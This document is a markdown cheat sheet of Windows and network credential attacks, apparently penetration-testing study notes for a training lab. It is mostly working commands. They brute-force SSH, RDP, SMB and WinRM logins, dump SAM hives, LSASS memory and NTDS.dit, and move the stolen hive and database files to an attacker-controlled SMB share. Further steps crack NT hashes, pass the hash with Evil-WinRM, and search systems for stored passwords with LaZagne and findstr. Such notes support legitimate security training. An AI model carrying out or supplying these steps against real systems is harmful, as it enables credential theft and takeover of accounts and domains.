# Network Services

## CrackMapExec

Can be used for WinRM, SMB, LDAP, MSSQL, and others

Installing
```
sudo apt-get -y install crackmapexec
```

Help with specific protocol
```
crackmapexec smb -h
```

Usage
```
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

```
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

## Evil-WinRM

Used for WinRM specifically

Installing
```
sudo gem install evil-winrm
```

Usage
```
evil-winrm -i <target-IP> -u <username> -p <password>
```

```
evil-winrm -i 10.129.42.197 -u user -p password
```

If successful, it uses a powershell connection

## Hydra - SSH

Used to brute force SSH

```
hydra -L user.list -P password.list ssh://10.129.42.197
```

## Hydra - RDP

Used to brute force RDP

```
hydra -L user.list -P password.list rdp://10.129.42.197
```


## Hydra - SMB

Used to brute force SMB

```
hydra -L user.list -P password.list smb://10.129.42.197
```

If you get the following error:
```
[ERROR] invalid reply from target smb://10.129.42.197:445/
```
This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile hydra or use another very powerful tool, the Metasploit framework.

```
msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 

Module options (auxiliary/scanner/smb/smb_login):

...

msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Then use CrackMapExec to view shares
```
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```

And use SMBClient to view contents
```
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

# Password Mutations

## Hashcat

Generate new wordlist adding mutations to the existing wordlist
```
cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

```
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

View existing rule files
```
ls /usr/share/hashcat/rules/
```

## CeWL

Can be used to crawl a site and generate a wordlist for possible passwords

```
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```



# Windows Local

## SAM

### Copying SAM Registry Hives

| Registry Hive | Description                                                                                                                                                |
| ------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| hklm\sam      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| hklm\system   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |
| hklm\security | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |

### Saving Copies

```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

### Sharing with attack box

Create SMB Share
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

Move files to share
```
move sam.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
```

### Dumping Hashes

Locating secretsdump
```
locate secretsdump 
```

Running secretsdump.py
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### Cracking with Hashcat

Add nthashes (second hash) to .txt file
```
sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

Running hashcat
```
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

### Dumping LSA Secrets

```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

### Dumping SAM Remotely

```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

## LSASS

### Creating copy of LSASS Memory

Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file

C:\\Users\\loggedonusersdirectory\\AppData\\Local\\Temp\\lsass.DMP

_OR_

find lsass.exe and its process ID in the PID field
```
tasklist /svc
```

In powershell
```
Get-Process lsass
```

Create Dump
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

### Extracting data from dump

```
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```

### Cracking the hash

```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## AD & NTDS.dit

[Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to generate a list of possible usernames

### Launching attack with crackmapexec
```
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

### Capturing NTDS.dit

NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest.

Connecting to DC
```
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

Checking local group membership
```
net localgroup
```

To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. 

Checking account privileges including Domain
```
net user bwilliamson
```

Create shadow copy of C:
```
vssadmin CREATE SHADOW /For=C:
```

Copy NTDS.dit from volume shadow copy to another location on the drive
```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

create an SMB share on our attack host using the method mentioned in [[#Sharing with attack box]]

Copy to attack host
```
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

*___OR__*

Use cme to capture NTDS.dit
```
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

### Cracking with Hashcat

```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

### Pass the Hash with Evil-WinRM

```
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```


## Credential Hunting

Use Windows Search to search for password or username to find files or applications

[LaZagne](https://github.com/AlessandroZ/LaZagne) to automate searching

```
start lazagne.exe all
```

Using findstr
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

Here are some other places we should keep in mind when credential hunting:

    Passwords in Group Policy in the SYSVOL share
    Passwords in scripts in the SYSVOL share
    Password in scripts on IT shares
    Passwords in web.config files on dev machines and IT shares
    unattend.xml
    Passwords in the AD user or computer description fields
    KeePass databases --> pull hash, crack and get loads of access.
    Found on user systems and shares
    Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint
